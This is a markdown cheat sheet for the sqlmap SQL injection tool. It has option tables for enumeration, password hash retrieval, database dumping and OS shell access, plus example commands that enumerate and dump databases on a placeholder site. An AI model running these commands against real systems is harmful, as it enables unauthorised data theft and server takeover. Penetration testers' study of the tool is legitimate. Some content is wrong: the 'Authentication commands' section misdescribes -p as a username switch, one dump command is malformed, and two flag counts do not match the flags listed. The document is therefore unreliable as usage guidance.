# SQLMap
SQLMap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

# Sqlmap Commands
To show the basic help menu, simply type sqlmap `-h` in the terminal.

## Basic commands
|      Options      | Description                                           |
| :---------------: | :---------------------------------------------------- |
| -u URL, --url=URL | Target URL (e.g. "http://www.site.com/vuln.php?id=1") |
|    --data=DATA    | Data string to be sent through POST (e.g. "id=1")     |
|  --random-agent   | Use randomly selected HTTP User-Agent header value    |
| -p TESTPARAMETER  | Testable parameter(s)                                 |
|   --level=LEVEL   | Level of tests to perform (1-5, default 1)            |
|    --risk=RISK    | Risk of tests to perform (1-3, default 1)             |

## Enumeration commands
These options can be used to enumerate the back-end database management system information, structure, and data contained in tables.

|     Options     | Description                                |
| :-------------: | :----------------------------------------- |
|    -a, --all    | Retrieve everything                        |
|  -b, --banner   | Retrieve DBMS banner                       |
| --current-user  | Retrieve DBMS current user                 |
|  --current-db   | Retrieve DBMS current database             |
|   --passwords   | Enumerate DBMS users password hashes       |
|      --dbs      | Enumerate DBMS databases                   |
|    --tables     | Enumerate DBMS database tables             |
|    --columns    | Enumerate DBMS database table columns      |
|    --schema     | Enumerate DBMS schema                      |
|     --dump      | Dump DBMS database table entries           |
|   --dump-all    | Dump all DBMS databases tables entries     |
|    --is-dba     | Detect if the DBMS current user is DBA     |
|  -D <DB NAME>   | DBMS database to enumerate                 |
|   --dbms=DBMS   | Force back-end DBMS to this value          |
| -T <TABLE_NAME> | DBMS database table(s) to enumerate        |
|     -C COL      | DBMS database table column(s) to enumerate |

## Operating System access commands
These options can be used to access the back-end database management system on the target operating system.

|    Options     | Description                                           |
| :------------: | :---------------------------------------------------- |
|   --os-shell   | Prompt for an interactive operating system shell      |
|    --os-pwn    | Prompt for an OOB shell, Meterpreter or VNC           |
| --os-cmd=OSCMD | Execute an operating system command                   |
|   --priv-esc   | Database process user privilege escalation            |
| --os-smbrelay  | One-click prompt for an OOB shell, Meterpreter or VNC |

Note that the tables shown above aren't all the possible switches to use with sqlmap. For a more extensive list of options, run sqlmap `-hh` to display the advanced help message.

## Authentication commands
For specifying a username you can use the `-p` switch followed by the parameter name. For example, if the username is `admin`, you can use `-p admin`.

# Examples
## Testing
### Simple HTTP GET Based Test
```bash
sqlmap -u https://testsite.com/page.php?id=7 --dbs
```
Here we have used two flags: `-u` to state the vulnerable URL and `--dbs` to enumerate the database.

### Simple HTTP POST Based Test
Save the POST data possibly gathered using Burp Proxy in a file named `req.txt` and run the following command

```bash
# sqlmap -r <request_file> -p <vulnerable_parameter> --dbs
sqlmap -r req.txt -p blood_group --dbs
```

Here we have used two flags: `-r` to read the file, `-p` to supply the vulnerable parameter, and `--dbs` to enumerate the database.

## Enumerate Database Tables
### Using GET based Method

```bash
sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables
```

### Using POST based Method

```bash
sqlmap -r req.txt -p blood_group -D blood --tables
sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
```

## Enumerate Database Columns
### Using GET based Method

```bash
sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns
```

### Using POST based Method

```bash
sqlmap -r req.txt -D blood -T blood_db --columns
sqlmap -r req.txt -D <database_name> -T <table_name> --columns
```

## Dump all available databases and tables
### Using GET based Method

```bash
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all
sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all
```

### Using POST based Method

```bash
sqlmap -r req.txt -D <database_name> --dump-all
sqlmap -r req.txt-p  -D <database_name> --dump-all
```